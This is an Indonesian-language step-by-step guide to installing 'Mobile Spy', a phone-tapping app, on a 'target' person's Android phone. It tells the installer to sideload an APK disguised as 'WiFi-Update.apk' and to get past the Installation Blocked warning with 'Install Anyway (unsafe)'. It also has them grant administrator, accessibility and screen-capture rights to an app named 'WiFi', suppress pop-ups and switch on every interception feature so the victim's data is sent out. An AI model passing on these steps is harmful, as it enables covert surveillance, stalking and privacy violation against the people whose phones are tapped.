Wizard Installer (Mobile-Spy)

February 25, 2018

Panduan Pemasangan Mobile Spy





CATATAN

Panduan ini menjelaskan langkah-langkah pemasangan / installation software pada handphone target. mohon ikuti panduan berikut dengan teliti. bila ada yang tidak bisa atau kurang paham dengan panduan yang dijelaskan disini tanyakan, kontak dibawah.









0.1. Pastikan sudah mengunduh Apps Mobile Spy.

Saya asumsikan bawah Anda sudah melakukan pengaturan Unknown Source / Sumber tidak dikenal Pilih tombol download untuk App Sadap » "WiFi-Update.apk" kurang lebih seperti gambar dibawah yang sudah diberi tanda. "Screenshot" dibawah ini.









0.2. Langkah-langkah pemasangan Apps.



Pilih tap » “Install” kurang lebih seperti gambar dibawah yang sudah diberi tanda.











TIPS

Jika muncul pesan Installation Blocked seperti screenshot dibawah berarti Anda tidak menonaktifkan Verify Apps. (Lihat Langkah Disable Package Verifier) atau alternatif lainnya ikuti panduan dibawah melalui ‘Install Anyway (Unsafe)’).

Pilih / Klik » More details
Selanjutnya Klik » Install Anyway (unsafe)





Jika Anda memiliki pesan diatas bahwa Anda tidak menonaktifkan Verify Apps. (Bila tidak pemberitahuan Installation Blocked. silahkan teruskan langkah selanjutnya).









0.3. Pilih » “OPEN” / “BUKA” kurang lebih seperti gambar dibawah yang sudah diberi tanda.









0.4. Ketentuan penggunaan perangkat sadap » ACCEPT.









0.4. Pilih tombol ” LOGIN “ Kurang lebih seperti ” SCREENSHOT “ yang diberi tanda dibawah ini.









0.5. Berikut adalah pengaturan ” KONFIGURASI “ yang diperlukan untuk dapat menjalankan perangkat monitoring. setiap pengaturan 1. 2. 3. 4. 5. 6. akan diarahkan pada masing - masing pengaturan setelah dari salah satu sudah melakukan pengaturan pilih tombol BACK untuk pengaturan lainnya.

  • 1. Device Administrator: Pilih » WiFi » Aktifkan, ketika ceklis pada pengaturan tersebut nanti akan diarahkan, untuk mengaktifkan izin Administrator. Aktifkan untuk app dengan nama Wi-Fi.
    (Pilih tombol Kembali / Back untuk melakukan pengaturan selanjutnya)
  • 2. Enable App Notifications: Pilih » WiFi » Aktifkan.
    (Pilih tombol Kembali / Back untuk melakukan pengaturan selanjutnya)
  • 3. Enable Accessibility: Pilih » WiFi » Aktifkan.
    (Pilih tombol Kembali / Back untuk melakukan pengaturan selanjutnya)
  • 4. Screen capture permission: Bila ada tampilan popup, setelah itu pilih GO » Ceklis (jangan tampilkan) » OK
  • 5. Data Usage: Akan diarahkan pada pengaturan, setelah itu pilih WiFI » Ceklis (Izinkan) » OK
  • 6. Data Usage: Akan diarahkan pada pengaturan, setelah itu pilih WiFI » Ceklis (Izinkan) » OK

Bila sudah semua setelah itu pilih ” NEXT “

Bagian I

Bagian II









0.6. Masukan Email & Kata Sandi, Lalu centang ketentuan penggunaan perangkat sadap, kemudian klik tombol “Login” setelah memasukan email dan password. Kurang lebih seperti “screenshot” yang diberi tanda dibawah ini.









0.7. Langkah-langkah dibawah akan mengktifkan daftar fitur disadap. ceklis semua fitur penyadapan bila semua diperlukan.

  • Ketika ceklis pemilihan fitur, Ada beberapa fitur, Anda akan diarahkan pada pengaturan tambahan, pastikan aktifkan untuk app dengan nama WiFi, setelah aktif kembali untuk memilih fitur kembali.
  • Localisations

Setelah itu pilih ” SAVE “

Tekan tombol “ceklis” untuk mengatifkan semua fitur penyadapan. Kurang lebih seperti “screenshot” yang diberi tanda dibawah ini.











0.9. Installation Success!, selanjutnya pilih “OK”, Selanjutnya pengaturan tambahan berikut ini.









0.10. Pengaturan tambahan untuk ponsel OPPO, VIVO, XIOAMI.

  • 1.Buka pintasan aplikasi tombol menu dengan icon “☰”
  • 2.Pilih MATA-MATA lalu tarik kebawah hingga muncul icon gembok pada pojok kiri atas.
  • 3.Setelah itu pilik OK

Selengkapnya bisa dilihat pada panduan dibawah.





TIPS

  1. Pastikan ponsel target slalu terhubung dengan internet, karna data yang akan diambil (disadap) dan dikirim melalui jaringan internet, minimal data internet (kuota) yang tersedia di ponsel target 1GB.
  2. Keamanan pada brand masing-masing Ponsel OS Android mungkin harus mengizinkan jalannya app sadap yang sudah terpasang, seperti brand Samsung, Xioami, OPPO dan lainnya... (Selengkapnya Bisa Hubungi Kami)









Pemasangan selesai!!
